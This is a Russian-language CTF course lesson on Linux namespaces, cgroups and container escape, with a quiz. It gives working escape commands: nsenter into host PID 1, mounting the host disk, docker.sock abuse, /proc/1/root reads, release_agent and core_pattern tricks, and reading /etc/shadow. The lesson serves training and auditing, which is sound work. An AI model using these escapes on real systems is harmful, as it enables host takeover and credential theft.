---
id: misc-namespace-escape
title: "Namespaces и cgroups: изоляция и побег"
category: misc
parent: misc-sandbox-containers
difficulty: expert
order: 3
tags: [namespace, cgroup, linux, isolation, escape, container]
prerequisites: [misc-sandbox-containers]
useful_for:
  - "CTF pwn/Misc категория"
  - "Аудит контейнерной изоляции"
  - "Побег из контейнеров"
estimated_minutes: 32
summary: "Восемь Linux-namespaces, cgroups v1/v2, как они образуют контейнер, проверка изоляции и типовые векторы побега через mount, /proc и capabilities."
---

Контейнер — это не отдельное ядро и не виртуальная машина. Это обычный процесс Linux, которому ядро «показывает» урезанную картину мира через **namespaces** и ограничивает ресурсы через **cgroups**. Понять это — значит понять, где изоляция дырявая. Побег из контейнера почти всегда сводится к тому, что namespace или capability настроены слишком щедро.

## Восемь namespaces

| Namespace | Флаг `clone` | Что изолирует |
|-----------|--------------|----------------|
| Mount | `CLONE_NEWNS` | точки монтирования |
| PID | `CLONE_NEWPID` | номера процессов |
| Network | `CLONE_NEWNET` | интерфейсы, порты |
| IPC | `CLONE_NEWIPC` | SysV IPC, очереди |
| UTS | `CLONE_NEWUTS` | hostname, домен |
| User | `CLONE_NEWUSER` | uid/gid, capabilities |
| Cgroup | `CLONE_NEWCGROUP` | иерархия cgroups |
| Time | `CLONE_NEWTIME` | монотонные/загрузочные часы |

Проверка, в каких namespace вы находитесь:

```bash
ls -l /proc/self/ns/
# mnt -> mnt:[4026531840]
# pid -> pid:[4026531836]
# net -> net:[4026531992]
# user -> user:[4026531837]
```

Сравните с PID 1 хоста: если `net` совпадает — вы в хост-сети.

## User namespace — важнейший

`CLONE_NEWUSER` позволяет непривилегированному пользователю «стать root» **внутри** namespace. Именно поэтому Docker с user-namespaces безопаснее. Но если контейнер запущен без user-namespace и с `CAP_SYS_ADMIN`, вы — настоящий root с возможностями.

```bash
unshare --user --map-root-user --mount-proc bash
# внутри: id -> uid=0(root)
```

Если `unshare` разрешён в песочнице, можно создать вложенные namespaces и обойти часть ограничений.

## cgroups v1 и v2

cgroups ограничивают CPU, память, устройства. Раньше через `release_agent` (cgroup v1) можно было **выполнить команду на хосте**: если контейнер имеет `CAP_SYS_ADMIN` и cgroup v1 смонтирован, вы пишете в `notify_on_release` и `release_agent` путь к скрипту на хосте. Это классический побег (CVE-2022-0492-подобные и исторические техники).

```bash
mount | grep cgroup
# cgroup on /sys/fs/cgroup type cgroup (rw,...,release_agent=/sbin/cgrp)
cat /proc/self/cgroup
# 0::/docker/<id>
```

В cgroup v2 `release_agent` убран, но остаются другие векторы (например, `core_pattern`).

## Векторы побега

1. **Привилегированный контейнер** (`--privileged`) — почти нет изоляции: есть все capabilities, доступ к устройствам. Побег тривиален: `mount /dev/sda1 /mnt` или `nsenter` в хост-PID.

2. **`docker.sock` внутри контейнера** — можно запустить новый контейнер с `-v /:/host`, смонтировав хост.

3. **`CAP_SYS_ADMIN`** — разрешает `mount`, `unshare`, `pivot_root`. Монтируем хост-диск или создаём новый mount-namespace с host-ФС.

4. **`/proc/sys/kernel/core_pattern`** — если writable, задаём скрипт, который выполнится на хосте при краше процесса.

5. **`/proc` хоста, смонтированный в контейнер** — видим и можем трогать чужие процессы (`nsenter --target <pid> --mount --uts --ipc --net --pid`).

6. **Общие тома (volume) с хоста** — если смонтирован `~/.ssh` или `/var/run`, можно писать на хост.

7. **Cgroup release_agent** — как выше.

## Полный разобранный пример

Дано: контейнер с `CAP_SYS_ADMIN`, `docker.sock` не смонтирован, но `/proc` хоста виден.

```bash
# находим хост-PID 1 в /proc
ps aux | head
# ... PID 1 — init хоста

# входим в его namespaces
nsenter --target 1 --mount --uts --ipc --net --pid --root -- /bin/bash
# теперь мы на хосте
cat /root/flag
```

`nsenter` с `--target 1` переходит в mount/pid/net-namespaces хостового init — это фактически полный побег, если есть `CAP_SYS_ADMIN`.

Если `nsenter` нет:

```bash
# монтируем хост-корень
mkdir /tmp/host
mount /dev/sda1 /tmp/host   # или через /proc/1/root
ls /proc/1/root/
cat /proc/1/root/root/flag
```

`/proc/1/root` — символическая ссылка на корень процесса 1; чтение через неё обходит mount-namespace.

## Обнаружение изоляции

```bash
# capabilities
grep CapEff /proc/self/status
capsh --decode=0000003fffffffff
# secrets
ls -la /var/run/docker.sock
cat /proc/1/cgroup
mount | grep -E 'cgroup|overlay'
```

Если видите `overlay` в mount — вы в контейнере. Если `docker.sock` — потенциальный побег. Если `CapEff` содержит `cap_sys_admin` — почти наверняка сбежите.

## Частые ошибки и подводные камни

- Путать «root внутри контейнера» с «root на хосте»: uid 0 без capabilities ограничен.
- Считать, что `--privileged` — редкость: в CTF это частый «подарок».
- Игнорировать user-namespace: без него uid-маппинг не защищает.
- Пробовать `release_agent` на cgroup v2 — там его нет.
- Не проверять `/proc/1/root` — часто самый простой путь.
- Забывать про монтированные тома: иногда `-v /:/host` уже сделан.

## Что дальше / решение

Разверните локально контейнеры с разными флагами (`--privileged`, `--cap-add SYS_ADMIN`, без user-namespace) и найдите побег в каждом. Изучите `misc-docker-misc` и `misc-container-runtime`. Дальше — `misc-seccomp-escape` для фильтров syscalls.

## Справочная таблица

| Вектор | Условие | Команда |
|--------|---------|---------|
| nsenter | CAP_SYS_ADMIN | `nsenter -t 1 -a` |
| /proc/1/root | /proc хоста виден | `cat /proc/1/root/...` |
| docker.sock | сокет смонтирован | `docker run -v /:/host` |
| mount | CAP_SYS_ADMIN | `mount /dev/sda1 /mnt` |
| release_agent | cgroup v1 + SYS_ADMIN | запись в release_agent |
| core_pattern | writable | задать скрипт |

## Дополнительная теория: capabilities и их опасность

Capabilities — это «нарезанные» привилегии root. Даже если uid ≠ 0, наличие `CAP_SYS_ADMIN` делает вас почти всемогущим в пространстве контейнера: он разрешает `mount`, `unshare`, `pivot_root`, `setns` (вход в чужие namespaces), `bpf`, многое другое. `CAP_NET_ADMIN` позволяет менять сеть, `CAP_SYS_PTRACE` — отлаживать чужие процессы, `CAP_DAC_READ_SEARCH` — обходить права на файлы. Docker по умолчанию даёт ограниченный набор; `--privileged` даёт все. В K8s `securityContext.capabilities.add` может случайно выдать лишнее.

Проверка: `grep Cap /proc/self/status` показывает `CapEff` (эффективные), `CapPrm`, `CapBnd`. `capsh --decode=<hex>` расшифрует. Для побега ищите комбинации: `CAP_SYS_ADMIN` → mount/nsenter; `CAP_DAC_READ_SEARCH` → чтение `/etc/shadow`; `CAP_SYS_PTRACE` → инъекция в процесс хоста. Даже без полного побега отдельные capabilities дают утечки.

## Seccomp, AppArmor, SELinux как дополнительный слой

Помимо namespaces, изоляцию формируют **seccomp** (ограничение syscalls), **AppArmor**/**SELinux** (мандатный контроль доступа) и **no-new-privileges**. Они могут заблокировать побег даже при наличии capabilities. Проверяйте: `cat /proc/self/status | grep Seccomp` (2 = фильтр), `cat /proc/self/attr/current` (профиль AppArmor/SELinux), `NoNewPrivs`. Если AppArmor в режиме `unconfined` — он не мешает. Если seccomp запрещает `mount`, побег через mount не сработает — тогда смотрите `misc-seccomp-escape`.

Понимание всех слоёв важно: побег — это поиск комбинации «слабое место в одном слое + отсутствие компенсации в другом».

## Разбор ошибок и отладка

Если `nsenter` возвращает «Operation not permitted» — нет `CAP_SYS_ADMIN` или seccomp блокирует `setns`. Если `mount` запрещён — проверьте AppArmor (`dmesg | tail` покажет denial). Если `/proc/1/root` недоступен — `/proc` может быть смонтирован с `hidepid` или в отдельном PID-namespace. Если `unshare` запрещён — возможно, `user.max_user_namespaces=0`. Ведите диагностику: `cat /proc/self/status`, `mount`, `ls -l /proc/1/root`, `ls /var/run/*.sock`. Каждый запрет сужает вектор; отсутствие запрета — ваш путь. Всегда начинайте с инвентаризации окружения.

## Практический разбор: побег через /proc/1/root

Условие: контейнер, `/proc` хоста виден (общий PID-namespace или `--pid=host`).

```bash
ls -l /proc/1/root
# lrwxrwxrwx 1 root root 0 ... /proc/1/root -> /
cat /proc/1/root/etc/hostname
# hostname хоста, а не контейнера
cat /proc/1/root/root/flag
# flag{proc_root_escape}
```

`/proc/1/root` — символическая ссылка на корень процесса 1 (хостового init). Чтение через неё обходит mount-namespace контейнера, потому что мы обращаемся к корню чужого процесса. Это один из самых простых побегов: не нужны capabilities, достаточно видеть `/proc` хоста. Если `/proc/1/root` недоступен — проверьте `/proc/1/cwd`, `/proc/1/exe` и `/proc/1/map_files`. Если PID-namespace изолирован, PID 1 — это init контейнера, и его root — корень контейнера, а не хоста; тогда нужен другой вектор (`nsenter` при `CAP_SYS_ADMIN`, docker.sock и т.д.). Всегда начинайте с `ls -l /proc/1/root` — это бесплатная проверка.

## Квиз

```quiz
- question: "Что изолирует PID namespace?"
  options:
    - "Номера процессов (видно только своё поддерево)"
    - "Сетевые интерфейсы"
    - "Точки монтирования"
    - "Hostname"
  answer: 0
  explanation: "Внутри контейнера PID 1 — это его init."
- question: "Что даёт `CLONE_NEWUSER`?"
  options:
    - "Позволяет стать root внутри namespace без прав на хосте"
    - "Шифрует диск"
    - "Ускоряет сеть"
    - "Отключает seccomp"
  answer: 0
  explanation: "User-namespace маппит uid/gid и capabilities."
- question: "Какой классический побег использует `docker.sock`?"
  options:
    - "Запуск нового контейнера с монтированием корня хоста"
    - "Изменение hostname"
    - "Смена пароля root"
    - "Перезагрузка хоста"
  answer: 0
  explanation: "Сокет даёт полный контроль над Docker-демоном."
- question: "Зачем проверять `/proc/1/root`?"
  options:
    - "Это ссылка на корень процесса 1 — часто путь к хост-ФС"
    - "Там хранятся пароли"
    - "Это точка входа SSH"
    - "Это лог ядра"
  answer: 0
  explanation: "Чтение через неё обходит mount-namespace."
- question: "Какая возможность делает побег из контейнера почти тривиальным?"
  options:
    - "CAP_SYS_ADMIN"
    - "CAP_NET_BIND_SERVICE"
    - "CAP_CHOWN"
    - "CAP_KILL"
  answer: 0
  explanation: "SYS_ADMIN разрешает mount, unshare, nsenter и многое."
```

## Где пригодится

- **CTF:** misc/pwn — побег из контейнера.
- **Аудит:** проверка конфигурации Docker/K8s.
- **Работа:** безопасность CI/CD, изоляция нагрузок.
- **Research:** контейнерные CVE и их эксплуатация.
